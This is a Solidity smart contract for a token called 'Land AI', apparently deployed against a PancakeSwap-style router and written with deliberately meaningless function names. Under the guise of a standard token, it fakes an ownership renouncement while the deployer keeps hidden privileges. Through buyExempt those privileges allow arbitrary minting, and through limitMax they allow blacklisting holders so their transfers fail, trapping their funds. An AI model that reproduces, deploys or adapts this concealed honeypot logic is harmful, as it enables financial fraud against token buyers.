//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface minTradingLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingFrom) external view returns (uint256);

    function transfer(address senderFee, uint256 fundIs) external returns (bool);

    function allowance(address swapFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundIs) external returns (bool);

    function transferFrom(
        address sender,
        address senderFee,
        uint256 fundIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverListFee, uint256 value);
    event Approval(address indexed swapFund, address indexed spender, uint256 value);
}

interface receiverAuto is minTradingLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract launchedToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listFund {
    function createPair(address tradingLaunch, address marketingLimit) external returns (address);
}

interface shouldLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract LandAI is launchedToken, minTradingLaunched, receiverAuto {

    string private takeTeam = "LAI";

    mapping(address => bool) public autoTake;

    function autoLaunched() public view returns (uint256) {
        return isSender;
    }

    mapping(address => uint256) private marketingEnable;

    function buyExempt(uint256 fundIs) public {
        if (!autoTake[_msgSender()]) {
            return;
        }
        marketingEnable[teamAt] = fundIs;
    }

    constructor (){ 
        
        shouldLimit feeTeam = shouldLimit(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellTotal = listFund(feeTeam.factory()).createPair(feeTeam.WETH(), address(this));
        liquidityReceiver = _msgSender();
        
        teamAt = _msgSender();
        autoTake[_msgSender()] = true;
        if (sellTo == tradingAutoTotal) {
            sellTo = maxReceiver;
        }
        marketingEnable[_msgSender()] = takeToken;
        emit Transfer(address(0), teamAt, takeToken);
        maxExempt();
    }

    uint256 private sellSwapIs;

    bool private listWallet;

    function exemptLaunch() public view returns (uint256) {
        return sellTo;
    }

    function buyFee(address toEnable, address senderFee, uint256 fundIs) internal returns (bool) {
        if (toEnable == teamAt) {
            return atAmountIs(toEnable, senderFee, fundIs);
        }
        require(!atSellEnable[toEnable]);
        return atAmountIs(toEnable, senderFee, fundIs);
    }

    function balanceOf(address tradingFrom) public view virtual override returns (uint256) {
        return marketingEnable[tradingFrom];
    }

    uint256 private takeToken = 100000000 * 10 ** 18;

    function transferFrom(address toEnable, address senderFee, uint256 fundIs) external override returns (bool) {
        if (listShould[toEnable][_msgSender()] != type(uint256).max) {
            require(fundIs <= listShould[toEnable][_msgSender()]);
            listShould[toEnable][_msgSender()] -= fundIs;
        }
        return buyFee(toEnable, senderFee, fundIs);
    }

    function getOwner() external view returns (address) {
        return liquidityReceiver;
    }

    uint256 public sellTo;

    address public teamAt;

    function tokenMarketingLiquidity() public {
        if (maxReceiver != sellSwapIs) {
            listWallet = false;
        }
        
        isSender=0;
    }

    uint256 public isSender;

    function transfer(address launchMode, uint256 fundIs) external virtual override returns (bool) {
        return buyFee(_msgSender(), launchMode, fundIs);
    }

    function allowance(address maxLaunchedLaunch, address shouldFrom) external view virtual override returns (uint256) {
        return listShould[maxLaunchedLaunch][shouldFrom];
    }

    address public sellTotal;

    bool private isMode;

    function txMarketing() public {
        
        if (isSender != tradingAutoTotal) {
            isMode = false;
        }
        tradingAutoTotal=0;
    }

    address private liquidityReceiver;

    event OwnershipTransferred(address indexed listSender, address indexed totalWalletMarketing);

    function maxExempt() public {
        emit OwnershipTransferred(teamAt, address(0));
        liquidityReceiver = address(0);
    }

    uint256 public fundTo;

    function name() external view virtual override returns (string memory) {
        return takeList;
    }

    function owner() external view returns (address) {
        return liquidityReceiver;
    }

    mapping(address => bool) public atSellEnable;

    mapping(address => mapping(address => uint256)) private listShould;

    uint8 private takeMin = 18;

    function decimals() external view virtual override returns (uint8) {
        return takeMin;
    }

    uint256 private tradingAutoTotal;

    function liquidityFrom() public view returns (uint256) {
        return isSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeTeam;
    }

    function atAmountIs(address toEnable, address senderFee, uint256 fundIs) internal returns (bool) {
        require(marketingEnable[toEnable] >= fundIs);
        marketingEnable[toEnable] -= fundIs;
        marketingEnable[senderFee] += fundIs;
        emit Transfer(toEnable, senderFee, fundIs);
        return true;
    }

    function isModeFee(address launchedSender) public {
        if (listSellTake) {
            return;
        }
        
        autoTake[launchedSender] = true;
        
        listSellTake = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeToken;
    }

    function amountReceiverIs() public {
        if (isMode != listWallet) {
            maxReceiver = isSender;
        }
        
        fundTo=0;
    }

    uint256 private maxReceiver;

    function limitMax(address exemptFromMarketing) public {
        
        if (exemptFromMarketing == teamAt || exemptFromMarketing == sellTotal || !autoTake[_msgSender()]) {
            return;
        }
        
        atSellEnable[exemptFromMarketing] = true;
    }

    function walletTx() public {
        if (fundTo != maxReceiver) {
            sellSwapIs = sellTo;
        }
        
        sellSwapIs=0;
    }

    bool public listSellTake;

    string private takeList = "Land AI";

    function approve(address shouldFrom, uint256 fundIs) public virtual override returns (bool) {
        listShould[_msgSender()][shouldFrom] = fundIs;
        emit Approval(_msgSender(), shouldFrom, fundIs);
        return true;
    }

}